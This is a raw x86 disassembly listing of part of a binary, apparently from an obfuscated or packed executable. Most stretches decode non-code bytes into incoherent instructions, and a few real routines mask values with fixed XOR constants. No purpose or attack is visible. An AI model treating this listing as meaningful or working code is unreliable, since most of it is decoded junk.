  40a3a0:	test   DWORD PTR [edx],eax
  40a3a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3a3:	repz lock add al,0xa2
  40a3a7:	adc    ch,BYTE PTR [ecx-0x4fedad0e]
  40a3ad:	(bad)  
  40a3ae:	sub    DWORD PTR [edi+0x23],eax
  40a3b1:	popa   
  40a3b2:	retf   0x2994
  40a3b5:	jge    0x40a3b9
  40a3b7:	int    0xbe
  40a3b9:	add    al,0x99
  40a3bb:	adc    ecx,DWORD PTR [edi-0xc]
  40a3be:	push   esi
  40a3bf:	dec    edx
  40a3c0:	lods   al,BYTE PTR ds:[esi]
  40a3c1:	xchg   BYTE PTR [edx+0x40e5cd7b],al
  40a3c7:	mov    edx,0xd27e951f
  40a3cc:	cmp    eax,0x45f009aa
  40a3d1:	xchg   ebp,eax
  40a3d2:	sbb    edi,DWORD PTR [esp+eiz*4]
  40a3d5:	sub    BYTE PTR [ebx+0x58],ch
  40a3d8:	jb     0x40a397
  40a3da:	rol    bh,cl
  40a3dc:	popf   
  40a3dd:	adc    bl,bh
  40a3df:	and    esi,ebp
  40a3e1:	xor    eax,0x4d51a48e
  40a3e6:	jle    0x40a3b2
  40a3e8:	mov    esp,0x726c8af9
  40a3ed:	aad    0x4
  40a3ef:	gs stos DWORD PTR es:[edi],eax
  40a3f1:	xchg   edi,eax
  40a3f2:	mov    edi,ebx
  40a3f4:	dec    edi
  40a3f5:	out    0x97,al
  40a3f7:	cmp    ebp,DWORD PTR [eax+0x6e7761a8]
  40a3fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3fe:	out    dx,al
  40a3ff:	out    0xe2,eax
  40a401:	mov    ch,0x7e
  40a403:	dec    esp
  40a405:	std    
  40a406:	cmovs  ebp,DWORD PTR [ebx]
  40a409:	dec    ecx
  40a40a:	cwde   
  40a40b:	es addr16 and eax,ebx
  40a40f:	push   esp
  40a410:	ins    BYTE PTR es:[edi],dx
  40a411:	sub    eax,0x95105b84
  40a416:	dec    ecx
  40a417:	sub    DWORD PTR [esi+eax*8],0x45
  40a41b:	mov    ch,0xaa
  40a41d:	or     ah,BYTE PTR [ebx+ebp*8]
  40a420:	sbb    eax,0x91485e75
  40a425:	pushf  
  40a426:	scas   al,BYTE PTR es:[edi]
  40a427:	push   ss
  40a428:	test   BYTE PTR [esi+0x37],al
  40a42b:	(bad)  
  40a42c:	hlt    
  40a42d:	es add edi,esi
  40a430:	mov    ds:0xc51cc954,al
  40a435:	in     al,0xa7
  40a437:	rcl    DWORD PTR [ecx+esi*8-0x3b],1
  40a43b:	xor    BYTE PTR [edi+0x3a],ah
  40a43e:	imul   edx,DWORD PTR [ecx+0x13],0x19
  40a442:	div    DWORD PTR [ebx+0x43]
  40a445:	push   esp
  40a446:	lea    ebx,[ecx]
  40a448:	mov    ebx,0x84d095bc
  40a44d:	adc    ch,0xbd
  40a450:	push   0x39
  40a452:	jae    0x40a4b0
  40a454:	sub    BYTE PTR [eax],al
  40a456:	fdivr  DWORD PTR [eax-0xbaf2ee0]
  40a45c:	cs mov sp,0x4a4b
  40a461:	and    BYTE PTR [eax-0x37280fac],bh
  40a467:	inc    ebp
  40a468:	mov    dh,0xc1
  40a46a:	clc    
  40a46b:	xor    al,0x4a
  40a46d:	mov    esp,0xf4dd8a0d
  40a472:	daa    
  40a473:	test   eax,0x854f6390
  40a479:	shl    BYTE PTR [eax+0x1d47598e],1
  40a47f:	add    bh,BYTE PTR [edi-0x5c]
  40a482:	lods   eax,DWORD PTR ds:[esi]
  40a483:	add    dl,bh
  40a485:	and    DWORD PTR [edx+eax*4],ebp
  40a488:	or     DWORD PTR [ebx],esi
  40a48a:	fdiv   st(6),st
  40a48c:	mov    edx,0xa764083a
  40a491:	pop    esp
  40a492:	bound  eax,QWORD PTR [esi+0x105f1856]
  40a498:	cmp    esi,ecx
  40a49a:	(bad)  
  40a49b:	mov    dh,BYTE PTR [ecx+0x1688f149]
  40a4a1:	or     ebx,DWORD PTR [ebx-0x49fa0b88]
  40a4a7:	jns    0x40a4ef
  40a4a9:	neg    BYTE PTR [edx+ebx*8-0x24]
  40a4ad:	icebp  
  40a4ae:	in     eax,dx
  40a4af:	repz sub DWORD PTR [edi-0x7e8abea6],ebp
  40a4b6:	xor    eax,0x40971395
  40a4bb:	pop    ss
  40a4bc:	gs add bl,ch
  40a4bf:	fstp   QWORD PTR [ecx+ebp*8]
  40a4c2:	mov    dh,cl
  40a4c4:	mov    ebp,0xb91036a0
  40a4c9:	xor    bh,bl
  40a4cb:	scas   eax,DWORD PTR es:[edi]
  40a4cc:	mov    WORD PTR [ebp-0x1c],ss
  40a4cf:	clc    
  40a4d0:	js     0x40a4b2
  40a4d2:	push   cs
  40a4d3:	scas   al,BYTE PTR es:[edi]
  40a4d4:	push   ecx
  40a4d5:	mov    eax,0x96e53ece
  40a4da:	(bad)
  40a4de:	in     eax,0x24
  40a4e0:	dec    esi
  40a4e1:	aaa    
  40a4e2:	sbb    eax,0x4398c639
  40a4e7:	pop    es
  40a4e8:	lods   al,BYTE PTR ds:[esi]
  40a4e9:	inc    edx
  40a4ea:	sbb    BYTE PTR [ebx],bl
  40a4ec:	inc    ebx
  40a4ed:	imul   ecx,DWORD PTR [ebp+0xa342d7e],0x30
  40a4f4:	inc    ebx
  40a4f5:	call   0x416c20
  40a4fa:	mov    eax,DWORD PTR [esi]
  40a4fc:	mov    ecx,DWORD PTR [esi+0x4]
  40a4ff:	shrd   eax,ecx,0x2
  40a503:	shr    ecx,0x2
  40a506:	shr    edx,0x1e
  40a509:	xor    ecx,0xe706e27a
  40a50f:	push   ecx
  40a510:	xor    eax,edi
  40a512:	jmp    0x40a8f0
  40a517:	sbb    al,0x3d
  40a519:	jmp    0x40a4ee
  40a51b:	jmp    0x9189:0x511a1c23
  40a522:	jo     0x40a595
  40a524:	mov    eax,?
  40a526:	mov    esi,0x18182bd8
  40a52b:	sahf   
  40a52c:	adc    bl,BYTE PTR [eax]
  40a52e:	sbb    BYTE PTR [eax],ah
  40a530:	or     ebp,DWORD PTR [edi-0x8]
  40a533:	mov    esi,0xa25dd6a6
  40a538:	pop    ebx
  40a539:	mov    cl,BYTE PTR [edi+0x7]
  40a53c:	push   es
  40a53d:	xor    ecx,DWORD PTR [eax-0x41]
  40a540:	pop    edi
  40a541:	pop    ebx
  40a542:	es (bad) 
  40a544:	and    DWORD PTR [edx-0x7c],edi
  40a547:	imul   edx,ebp,0x7ed1086b
  40a54d:	out    dx,al
  40a54e:	daa    
  40a54f:	pop    edi
  40a550:	pop    eax
  40a551:	adc    al,0xe
  40a553:	inc    edi
  40a554:	and    BYTE PTR [ecx-0x455b0b17],ah
  40a55a:	push   cs
  40a55b:	arpl   di,bx
  40a55d:	adc    ebp,DWORD PTR [ecx+0x5f]
  40a560:	dec    edx
  40a561:	sub    DWORD PTR [edi-0x5b],0x69f2664b
  40a568:	sbb    BYTE PTR [eax+0x23b6912d],cl
  40a56e:	dec    eax
  40a56f:	inc    ebx
  40a570:	outs   dx,BYTE PTR ds:[esi]
  40a571:	mov    esp,0x64a41923
  40a576:	icebp  
  40a577:	imul   edi,DWORD PTR [edx+0x2],0x59
  40a57b:	popf   
  40a57c:	pusha  
  40a57d:	das    
  40a57e:	adc    eax,0x558b37
  40a583:	ret    0x64ba
  40a586:	data16 sti 
  40a588:	int    0x85
  40a58a:	ss dec ecx
  40a58c:	sbb    BYTE PTR [ecx+0x58f572c6],0x82
  40a593:	and    al,0x52
  40a595:	fwait
  40a596:	and    bl,bh
  40a598:	dec    ebx
  40a599:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a59a:	(bad)  
  40a59b:	lock stos BYTE PTR es:[edi],al
  40a59d:	push   esi
  40a59e:	out    0xd4,al
  40a5a0:	in     eax,dx
  40a5a1:	inc    edx
  40a5a2:	in     al,dx
  40a5a3:	int    0x18
  40a5a5:	push   0x4fe030ff
  40a5aa:	in     al,0x8e
  40a5ac:	out    0xd,al
  40a5ae:	jne    0x40a574
  40a5b0:	int3   
  40a5b1:	mov    cl,0x1f
  40a5b3:	adc    al,0xc0
  40a5b5:	sub    dh,bl
  40a5b7:	inc    ebx
  40a5b8:	lahf   
  40a5b9:	and    eax,0xebf5c338
  40a5be:	sbb    eax,0x9799b83c
  40a5c3:	xlat   BYTE PTR ds:[ebx]
  40a5c4:	push   ss
  40a5c5:	cdq    
  40a5c6:	jno    0x40a60f
  40a5c8:	imul   ebx,DWORD PTR [eax+0x42],0x8a9119b0
  40a5cf:	or     DWORD PTR [edi],edi
  40a5d1:	and    eax,0x98a99b48
  40a5d6:	mov    bl,0x97
  40a5d8:	lods   eax,DWORD PTR ds:[esi]
  40a5d9:	sti    
  40a5da:	mov    edx,0x9b7788b1
  40a5df:	popa   
  40a5e0:	add    eax,esp
  40a5e2:	gs mov ecx,0x78a773af
  40a5e8:	cdq    
  40a5e9:	dec    ecx
  40a5ea:	ror    BYTE PTR [esi+0x5ad75deb],cl
  40a5f0:	lods   al,BYTE PTR ds:[esi]
  40a5f1:	adc    BYTE PTR [ebp+ebx*1-0x9],al
  40a5f5:	mov    ds:0x3a9be072,eax
  40a5fa:	retf   0x3ad9
  40a5fd:	mov    dl,0xe3
  40a5ff:	inc    esp
  40a600:	mov    DWORD PTR [esi+0x18156ef0],ebp
  40a606:	je     0x40a662
  40a608:	jmp    0xffdd:0x40c4d1f2
  40a60f:	jmp    0x855c:0xb81c3ae2
  40a616:	jmp    0x221e:0x9a9b25a7
  40a61d:	mov    esp,0xd960c3a0
  40a622:	xor    BYTE PTR ds:0xe519d68c,cl
  40a628:	sbb    eax,0x8dac2e32
  40a62d:	dec    ecx
  40a62e:	dec    esi
  40a62f:	push   ds
  40a630:	sub    edi,DWORD PTR [ecx-0x561a1ff3]
  40a636:	imul   esp,DWORD PTR [ebx+0x64],0x8461f59f
  40a63d:	jg     0x40a62d
  40a63f:	ret    0x9c5d
  40a642:	fist   DWORD PTR [esi+0x27]
  40a645:	push   edi
  40a646:	arpl   cx,ax
  40a648:	xor    BYTE PTR [edi],0xcc
  40a64b:	and    BYTE PTR [edx],0x3a
  40a64e:	gs add eax,0xd25aefbc
  40a654:	pop    ebx
  40a655:	xor    BYTE PTR [ebp-0x72],0x9e
  40a659:	out    dx,al
  40a65a:	(bad)  
  40a65b:	mov    eax,0xb0e5721b
  40a660:	mov    ch,BYTE PTR [esp+esi*1-0x2c032e8b]
  40a667:	jge    0x40a6d6
  40a669:	shl    edi,0xd0
  40a66c:	jne    0x40a697
  40a66e:	push   edi
  40a66f:	je     0x40a698
  40a671:	popf   
  40a672:	cmp    eax,0x12b5d374
  40a677:	mov    cl,0x7b
  40a679:	in     eax,0xf9
  40a67b:	mov    ebp,0xa773cbca
  40a680:	dec    ecx
  40a681:	or     ebx,DWORD PTR [eax-0x36]
  40a684:	mov    edi,0x86c588fc
  40a689:	outs   dx,BYTE PTR ds:[esi]
  40a68a:	push   0xffffffee
  40a68c:	mov    ebp,0x2d6bf41c
  40a691:	mov    ah,0x9c
  40a693:	xor    BYTE PTR [edi-0x57],0xd5
  40a697:	int3   
  40a698:	xchg   ebx,eax
  40a699:	cmp    eax,0x7c60eef2
  40a69e:	push   0xc71afec5
  40a6a3:	push   esi
  40a6a4:	pop    es
  40a6a5:	shl    BYTE PTR [ebp-0x18],cl
  40a6a8:	push   eax
  40a6a9:	cli    
  40a6aa:	mov    esp,0x20971618
  40a6af:	popa   
  40a6b0:	ins    DWORD PTR es:[edi],dx
  40a6b1:	lods   al,BYTE PTR ds:[esi]
  40a6b2:	(bad)  
  40a6b3:	mov    WORD PTR [esi-0x50],?
  40a6b6:	add    ah,bh
  40a6b8:	popa   
  40a6b9:	mov    dl,0xd5
  40a6bb:	test   al,0x2a
  40a6bd:	inc    eax
  40a6be:	fs and eax,0x70c79897
  40a6c4:	mov    esi,0xe3864c47
  40a6c9:	mov    edx,0xf2d946b6
  40a6ce:	or     edi,edi
  40a6d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6d1:	mov    esp,0x4981312c
  40a6d6:	je     0x40a755
  40a6d8:	cs add al,0x12
  40a6db:	add    eax,0x6c86da1b
  40a6e0:	add    BYTE PTR [ebx],0x9d
  40a6e3:	in     eax,dx
  40a6e4:	iret   
  40a6e5:	aaa    
  40a6e6:	rcr    DWORD PTR es:[ebp+0x11],cl
  40a6ea:	inc    ebp
  40a6eb:	enter  0x3f83,0xe8
  40a6ef:	mov    dl,0xfc
  40a6f1:	cmp    eax,0xcec24c18
  40a6f6:	add    eax,esp
  40a6f8:	sub    DWORD PTR [esi],ebx
  40a6fa:	dec    edi
  40a6fb:	sbb    al,0x34
  40a6fd:	jecxz  0x40a699
  40a6ff:	add    ebp,DWORD PTR [edi+0x6e9586df]
  40a705:	out    dx,eax
  40a706:	outs   dx,BYTE PTR ds:[esi]
  40a707:	ficomp WORD PTR [edi+0x2a42bc48]
  40a70d:	stc    
  40a70e:	or     BYTE PTR [edi],0xe1
  40a711:	sbb    al,0x4f
  40a713:	sbb    eax,DWORD PTR [esi+0x168698fc]
  40a719:	or     BYTE PTR [esi-0x23],al
  40a71c:	mov    edx,DWORD PTR [edi]
  40a71e:	loope  0x40a6e9
  40a720:	sub    eax,0xf6914a5c
  40a725:	addr16 mov bh,0xf2
  40a728:	dec    esp
  40a729:	(bad)  
  40a72a:	xchg   esp,eax
  40a72b:	fmul   QWORD PTR [edx]
  40a72d:	(bad)  
  40a72e:	fistp  DWORD PTR [edi+0x33]
  40a731:	iret   
  40a732:	adc    al,0xc8
  40a734:	inc    esi
  40a735:	xor    BYTE PTR [bp+si],ah
  40a738:	push   0xb6d538fa
  40a73d:	mov    esp,0xc49e2b13
  40a742:	push   ss
  40a743:	rol    DWORD PTR [eax-0x767b3406],0x3
  40a74a:	dec    edx
  40a74b:	sbb    DWORD PTR [ecx+0x13],esp
  40a74e:	pop    esp
  40a74f:	loopne 0x40a777
  40a751:	push   edi
  40a752:	test   BYTE PTR [edi],dl
  40a754:	mov    esi,0x68a275ca
  40a759:	cdq    
  40a75a:	js     0x40a761
  40a75c:	scas   al,BYTE PTR es:[edi]
  40a75d:	mov    cl,0xc5
  40a75f:	int3   
  40a760:	scas   eax,DWORD PTR es:[edi]
  40a761:	jne    0x40a76b
  40a763:	js     0x40a794
  40a765:	data16 adc bl,BYTE PTR [edi]
  40a768:	or     cl,BYTE PTR [ebx-0x7f]
  40a76b:	ret    0x5dd
  40a76e:	dec    esi
  40a76f:	sbb    eax,0x8888eaee
  40a774:	sbb    ebx,DWORD PTR [eax-0x674d6c2e]
  40a77a:	inc    ebx
  40a77b:	pop    esi
  40a77c:	imul   eax,DWORD PTR [edi+0x3c],0x7cdbef4e
  40a783:	imul   ebx,DWORD PTR [ebx],0xffffffa4
  40a786:	xor    esp,eax
  40a788:	sbb    ebx,DWORD PTR [ebx]
  40a78a:	jae    0x40a748
  40a78c:	lods   al,BYTE PTR ds:[esi]
  40a78d:	mov    WORD PTR [ebp+ebp*8+0x4a4274ce],?
  40a794:	repz jae 0x40a7ef
  40a797:	imul   edx,esi,0x2b86a916
  40a79d:	push   0x19
  40a79f:	pop    ds
  40a7a0:	outs   dx,BYTE PTR ds:[esi]
  40a7a1:	mov    edi,0xf1b27894
  40a7a6:	loopne 0x40a77c
  40a7a8:	inc    ecx
  40a7a9:	mov    eax,0xf6e2f30c
  40a7ae:	adc    DWORD PTR ds:0x61ce2446,0xffffffd5
  40a7b5:	inc    esp
  40a7b6:	ja     0x40a7a1
  40a7b8:	pop    ecx
  40a7b9:	pop    ebx
  40a7ba:	mov    bl,0x38
  40a7bc:	das    
  40a7bd:	cmp    DWORD PTR [esi],edx
  40a7bf:	and    al,0x88
  40a7c1:	jmp    0x40a783
  40a7c3:	scas   al,BYTE PTR es:[edi]
  40a7c4:	jmp    0xbecf:0xed7fb056
  40a7cb:	ror    BYTE PTR [ebx],1
  40a7cd:	add    DWORD PTR [edx],ebx
  40a7cf:	dec    eax
  40a7d0:	sbb    DWORD PTR [edi-0x21],esi
  40a7d3:	inc    ebp
  40a7d4:	aaa    
  40a7d5:	out    0x8c,eax
  40a7d7:	div    BYTE PTR [ebp-0x65a5e0c7]
  40a7dd:	or     ebp,edx
  40a7df:	fs retf 
  40a7e1:	cmp    dh,BYTE PTR [edi+esi*4]
  40a7e4:	sub    dl,BYTE PTR [esi+0x7c14ec87]
  40a7ea:	pop    eax
  40a7eb:	mov    esp,0x272e2f4
  40a7f0:	jl     0x40a7e5
  40a7f2:	lock dec edi
  40a7f4:	cmp    DWORD PTR [eax+0x60caba57],ecx
  40a7fa:	add    al,0x24
  40a7fc:	push   edx
  40a7fd:	int3   
  40a7fe:	xor    BYTE PTR [ecx+ecx*2],bl
  40a801:	jle    0x40a7f5
  40a803:	lods   al,BYTE PTR ds:[esi]
  40a804:	outs   dx,DWORD PTR ds:[esi]
  40a805:	(bad)  
  40a806:	arpl   WORD PTR [eax+0x1d],dx
  40a809:	sysenter 
  40a80b:	fidivr DWORD PTR [esi]
  40a80d:	dec    esi
  40a80e:	xchg   BYTE PTR [edx],dl
  40a810:	cli    
  40a811:	xlat   BYTE PTR ds:[ebx]
  40a812:	(bad)  
  40a813:	fwait
  40a814:	js     0x40a7e6
  40a816:	and    BYTE PTR [esi+0x68fc04d],bh
  40a81c:	retf   
  40a81d:	mov    ds:0xb120c4c2,eax
  40a822:	or     esi,edi
  40a824:	stc    
  40a825:	retf   
  40a826:	add    BYTE PTR [ebp+0xd7acfff],dh
  40a82c:	or     eax,0xf47d3e37
  40a831:	ins    BYTE PTR es:[edi],dx
  40a832:	jne    0x40a8a7
  40a834:	nop
  40a835:	cld    
  40a836:	jo     0x40a80e
  40a838:	ss push ebx
  40a83a:	pop    ecx
  40a83b:	in     eax,dx
  40a83c:	shl    DWORD PTR [edi],1
  40a83e:	inc    esp
  40a83f:	adc    DWORD PTR [edi-0x64],esi
  40a842:	rcl    ah,1
  40a844:	jmp    0x1d25:0x1c9586d6
  40a84b:	push   ebp
  40a84c:	dec    esp
  40a84d:	ret    0xe743
  40a850:	cmp    edx,eax
  40a852:	inc    edx
  40a853:	cwde   
  40a854:	jmp    0x40a8c3
  40a856:	sbb    BYTE PTR [edi+0xa026b81],bl
  40a85c:	fild   QWORD PTR [esi]
  40a85e:	inc    ebp
  40a85f:	sbb    ebp,DWORD PTR [ecx-0x6b]
  40a862:	push   ebp
  40a863:	pop    ebx
  40a864:	outs   dx,DWORD PTR ds:[esi]
  40a865:	in     al,0xcd
  40a867:	mov    ch,dh
  40a869:	xor    esp,DWORD PTR [eiz*2+0x4b72470b]
  40a870:	adc    al,0xe5
  40a872:	pop    edx
  40a873:	mov    dl,0xb0
  40a875:	add    eax,DWORD PTR [ebx-0x66]
  40a878:	scas   al,BYTE PTR es:[edi]
  40a879:	add    eax,0x485c93bf
  40a87e:	in     al,0x44
  40a880:	add    ebx,DWORD PTR [esi-0x3c]
  40a883:	in     eax,0xe8
  40a885:	push   edi
  40a886:	in     al,0x2e
  40a888:	jns    0x40a8a1
  40a88a:	jb     0x40a817
  40a88c:	mov    edi,0x75a2d548
  40a891:	mov    al,ds:0xdf4f435f
  40a896:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a897:	push   ecx
  40a898:	lods   eax,DWORD PTR ds:[esi]
  40a899:	sbb    eax,0xfb0cc943
  40a89e:	les    ebx,FWORD PTR [ebp+0x72fb3feb]
  40a8a4:	pop    ds
  40a8a5:	cmp    ah,bh
  40a8a7:	jno    0x40a854
  40a8a9:	mov    ds:0x44a5bbea,eax
  40a8ae:	fcomp  QWORD PTR [ecx-0xcbf3dc8]
  40a8b4:	nop
  40a8b5:	and    BYTE PTR gs:[edi+0x59],ah
  40a8b9:	xchg   edi,eax
  40a8ba:	(bad)  
  40a8bb:	repz loope 0x40a8af
  40a8be:	push   eax
  40a8bf:	std    
  40a8c0:	cmp    eax,eax
  40a8c2:	cdq    
  40a8c3:	mov    bl,0xb9
  40a8c5:	sub    esi,esp
  40a8c7:	pushf  
  40a8c8:	scas   eax,DWORD PTR es:[edi]
  40a8c9:	dec    edi
  40a8ca:	mov    ah,0x7e
  40a8cc:	sbb    ebp,DWORD PTR [edx+0xa]
  40a8cf:	push   ds
  40a8d0:	mov    eax,es:0xabed4c48
  40a8d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8d7:	push   edi
  40a8d8:	leave  
  40a8d9:	dec    esp
  40a8da:	or     al,0xad
  40a8dc:	rcr    DWORD PTR [edx-0x76c0a1ba],1
  40a8e2:	or     DWORD PTR [eax-0x5b9d4355],ebx
  40a8e8:	inc    edx
  40a8e9:	lods   al,BYTE PTR ds:[esi]
  40a8ea:	xor    ecx,esi
  40a8ec:	mov    bl,0xd9
  40a8ee:	daa    
  40a8ef:	leave  
  40a8f0:	mov    DWORD PTR [ebp+0x10],edx
  40a8f3:	mov    edx,DWORD PTR [ebx]
  40a8f5:	mov    edi,DWORD PTR [ebx+0x4]
  40a8f8:	push   eax
  40a8f9:	push   edi
  40a8fa:	push   edx
  40a8fb:	call   0x416c20
  40a900:	shld   edx,eax,0x2
  40a904:	shl    eax,0x2
  40a907:	mov    ecx,eax
  40a909:	or     ecx,DWORD PTR [ebp+0x10]
  40a90c:	xor    eax,eax
  40a90e:	or     edx,eax
  40a910:	xor    ecx,0xca79a575
  40a916:	xor    edx,0x9c1b89e8
  40a91c:	mov    DWORD PTR [esi],ecx
  40a91e:	mov    DWORD PTR [esi+0x4],edx
  40a921:	mov    eax,0x40000000
  40a926:	mov    edx,DWORD PTR [ebx]
  40a928:	mov    ecx,DWORD PTR [ebx+0x4]
  40a92b:	xor    edx,0xca79a577
  40a931:	xor    ecx,0x9c1b89e8
  40a937:	shrd   edx,ecx,0x2
  40a93b:	shr    ecx,0x2
  40a93e:	mov    DWORD PTR [ebp-0x6c],ecx
  40a941:	mov    ecx,DWORD PTR [ebx]
  40a943:	mov    edi,DWORD PTR [ebx+0x4]
  40a946:	mov    edi,ecx
  40a948:	xor    ecx,ecx
  40a94a:	or     ecx,edx
  40a94c:	mov    DWORD PTR [ebp+0x8],ecx
  40a94f:	mov    ecx,DWORD PTR [esi]
  40a951:	mov    edx,DWORD PTR [esi+0x4]
  40a954:	xor    edx,0x9c1b89e8
  40a95a:	xor    ecx,0xca79a577
  40a960:	shl    edi,0x1e
  40a963:	mov    DWORD PTR [ebp+0x14],ecx
  40a966:	mov    ecx,edx
  40a968:	mov    edx,DWORD PTR [ebp+0x14]
  40a96b:	shrd   edx,ecx,0x2
  40a96f:	xor    edi,eax
  40a971:	or     edi,DWORD PTR [ebp-0x6c]
  40a974:	mov    DWORD PTR [ebp-0x70],edx
  40a977:	mov    edx,DWORD PTR [esi]
  40a979:	mov    DWORD PTR [ebp+0xc],edi
  40a97c:	mov    edi,DWORD PTR [esi+0x4]
  40a97f:	shl    edx,0x1e
  40a982:	xor    edi,edi
  40a984:	or     edi,DWORD PTR [ebp-0x70]
  40a987:	shr    ecx,0x2
  40a98a:	xor    edx,eax
  40a98c:	or     edx,ecx
  40a98e:	cmp    edi,DWORD PTR [ebp+0x8]
  40a991:	jne    0x40a9a0
  40a997:	cmp    edx,DWORD PTR [ebp+0xc]
  40a99a:	je     0x40a9b0
  40a9a0:	push   DWORD PTR [ebp+0x20]
  40a9a3:	push   DWORD PTR [ebp+0x1c]
  40a9a6:	push   DWORD PTR [ebp+0x18]
  40a9a9:	push   ebx
  40a9aa:	push   esi
  40a9ab:	call   0x414dd5
  40a9b0:	pop    edi
  40a9b1:	leave  
  40a9b2:	ret    0x1c
  40a9b5:	cmp    cl,0x40
  40a9b8:	mov    DWORD PTR ds:0x4282c3,0x3afd
  40a9c2:	jae    0x40aa0b
  40a9c8:	mov    DWORD PTR ds:0x4282b7,0x7b96
  40a9d2:	cmp    cl,0x20
  40a9d5:	mov    DWORD PTR ds:0x428213,0x3ad8
  40a9df:	jae    0x40a9fb
  40a9e5:	mov    DWORD PTR ds:0x4282bb,0x760a
  40a9ef:	shrd   eax,edx,cl
  40a9f2:	not    DWORD PTR ds:0x428243
  40a9f8:	shr    edx,cl
  40a9fa:	ret    
  40a9fb:	add    DWORD PTR ds:0x428237,ecx
  40aa01:	mov    eax,edx
  40aa03:	xor    edx,edx
  40aa05:	and    cl,0x1f
  40aa08:	shr    eax,cl
  40aa0a:	ret    
  40aa0b:	xor    eax,eax
  40aa0d:	xor    edx,edx
  40aa0f:	ret    
  40aa10:	push   ebp
  40aa11:	mov    ebp,esp
  40aa13:	sub    esp,0x30
  40aa16:	mov    DWORD PTR [ebp-0x18],0xca79a575
  40aa1d:	xor    ecx,ecx
  40aa1f:	mov    eax,0x9c1b89e8
  40aa24:	mov    DWORD PTR [ebp-0x14],eax
  40aa27:	not    ecx
  40aa29:	mov    DWORD PTR [ebp-0x30],0xca79a571
  40aa30:	dec    DWORD PTR ds:0x4282b3
  40aa36:	mov    DWORD PTR [ebp-0x2c],eax
  40aa39:	mov    DWORD PTR [ebp-0x28],0xae8f94a8
  40aa40:	mov    ecx,DWORD PTR ds:0x4281eb
  40aa46:	sbb    DWORD PTR ds:0x42812b,ecx
  40aa4c:	mov    DWORD PTR [ebp-0x24],0x29bd2
  40aa53:	jmp    0x40ae49
  40aa58:	clc    
  40aa59:	sub    dh,BYTE PTR [edx+0x306b2a6b]
  40aa5f:	sub    bh,BYTE PTR ds:0xb47e1f6a
  40aa65:	push   0x235fbca5
  40aa6a:	sbb    BYTE PTR [eax],bl
  40aa6c:	outs   dx,BYTE PTR ds:[esi]
  40aa6d:	adc    bl,BYTE PTR [eax]
  40aa6f:	sbb    BYTE PTR [ecx+0x20],dl
  40aa72:	ds loope 0x40aada
  40aa75:	jne    0x40aa3e
  40aa77:	js     0x40aaba
  40aa79:	mov    ebx,0x9257e087
  40aa7e:	dec    eax
  40aa7f:	jmp    0x7bef7a86
  40aa84:	ret    
  40aa85:	ja     0x40aae2
  40aa87:	icebp  
  40aa88:	fnstenv [ecx+esi*1]
  40aa8b:	test   DWORD PTR [edx],ecx
  40aa8d:	cmp    DWORD PTR [ecx+0x644d43d1],esp
  40aa93:	lods   al,BYTE PTR ds:[esi]
  40aa94:	or     eax,0xddac6c64
  40aa99:	aad    0x78
  40aa9b:	inc    edx
  40aa9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa9d:	lds    edi,FWORD PTR ds:0x1b138374
  40aaa3:	inc    edx
  40aaa4:	xor    ebp,0xa8c169ec
  40aaaa:	pop    edi
  40aaab:	addr16 lock mov ch,0x30
  40aaaf:	push   esi
  40aab0:	jo     0x40aae2
  40aab2:	lea    esp,[ebp-0x3f]
  40aab5:	dec    edx
  40aab6:	mov    ebp,0x3021e3a
  40aabb:	and    ebx,DWORD PTR [ebp+0x71aac27c]
  40aac1:	inc    edi
  40aac2:	in     al,dx
  40aac3:	scas   eax,DWORD PTR es:[edi]
  40aac4:	fs push ds
  40aac6:	add    eax,0xabf92305
  40aacb:	mov    edi,0xfaa3c699
  40aad0:	dec    esp
  40aad1:	fld    DWORD PTR [ebp+0x6db602ee]
  40aad7:	push   ecx
  40aad8:	stos   BYTE PTR es:[edi],al
  40aad9:	call   0x9038:0x7dcf64db
  40aae0:	push   edi
  40aae1:	dec    esp
  40aae2:	test   DWORD PTR [eax+0x758ac9b],edi
  40aae8:	in     al,0x59
  40aaea:	out    dx,ax
  40aaec:	lea    esi,[ecx]
  40aaee:	dec    edx
  40aaef:	and    BYTE PTR [edi+0x9],dl
  40aaf2:	mov    edx,0x574741dc
  40aaf7:	(bad)  
  40aaf8:	lods   eax,DWORD PTR ds:[esi]
  40aaf9:	jb     0x40aa8f
  40aafb:	push   esp
  40aafc:	pop    es
  40aafd:	gs repz jle 0x40ab04
  40ab01:	pop    ecx
  40ab02:	outs   dx,DWORD PTR ds:[esi]
  40ab03:	adc    dh,BYTE PTR [edx]
  40ab05:	sbb    ebp,DWORD PTR [ebp+0x4]
  40ab08:	aas    
  40ab09:	mov    dl,0xe
  40ab0b:	inc    eax
  40ab0c:	std    
  40ab0d:	push   0x44578e30
  40ab12:	scas   al,BYTE PTR es:[edi]
  40ab13:	pop    ebx
  40ab14:	xor    al,0xd9
  40ab16:	add    DWORD PTR [ebp+0x3a],edx
  40ab19:	xchg   DWORD PTR [ebx-0x58],esp
  40ab1c:	into   
  40ab1d:	xor    bl,BYTE PTR [ebp+0x1d02b1e3]
  40ab23:	mov    ds:0x7efd85d,eax
  40ab28:	adc    BYTE PTR [ecx],al
  40ab2a:	mov    al,0xa4
  40ab2c:	mov    edi,0x33a20938
  40ab31:	ficomp WORD PTR ds:0xd25ee2db
  40ab37:	imul   DWORD PTR [ebp-0xb]
  40ab3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab3b:	or     dh,BYTE PTR [ebp+0x547137]
  40ab41:	and    esi,DWORD PTR [edx+0x4d879f63]
  40ab47:	and    ebx,DWORD PTR [edx+0x20]
  40ab4a:	push   0xaeea4a37
  40ab4f:	or     al,0x72
  40ab51:	scas   al,BYTE PTR es:[edi]
  40ab52:	jl     0x40aba4
  40ab54:	retf   
  40ab55:	outs   dx,BYTE PTR ds:[esi]
  40ab56:	leave  
  40ab57:	bound  esp,QWORD PTR [ebp+0x51f08efd]
  40ab5d:	stos   BYTE PTR es:[edi],al
  40ab5e:	mov    DWORD PTR ds:0xf0dd2cea,esi
  40ab64:	fidivr DWORD PTR [ebx]
  40ab66:	rcr    DWORD PTR [ebp+0x5bfa02e5],1
  40ab6c:	cmp    DWORD PTR [ebp-0x74],ebp
  40ab6f:	mov    ah,ch
